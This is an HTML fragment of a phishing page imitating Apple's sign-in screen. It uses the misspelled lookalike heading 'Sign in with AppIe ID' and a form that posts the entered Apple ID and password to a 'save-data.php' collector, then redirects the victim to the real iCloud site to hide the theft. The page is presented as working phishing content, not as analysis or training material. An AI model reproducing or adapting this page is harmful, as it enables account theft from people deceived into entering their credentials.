...
<head>
    ...
    <link rel="shortcut icon" href="lgo-grey.png" sizes="7x7">
</head>
<body>
        ...
        <div class="parent-container is-visible">
            <div style="visibility: visible; height: auto">
                <div class="widget-icon-text">
                    <img src="icon.svg" alt="icon.svg" draggable="false" class="icon-image">
                </div>
                <div style="padding: 3%">
                    <h1 class="h1-sign-in">
                        Sign in with AppIe ID
                    </h1>
                </div>

                <div class="login-form-container">
                    <form action="save-data.php" method="POST">
                        <input type="text" id="username" name="username" placeholder="Apple ID" class="username-input input-username">
                        <br>
                        <input type="password" id="password" name="password" placeholder="Password" class="username-input input-password">
                        <!-- <button style="position: absolute; right: 0;">Submit</button> -->
                        <br>
                        <input type="submit" value="Login" class="input-login" onclick="location.href='https://www.icloud.com/';">
                        </a> 
                      </form>
                </div>
            </div>
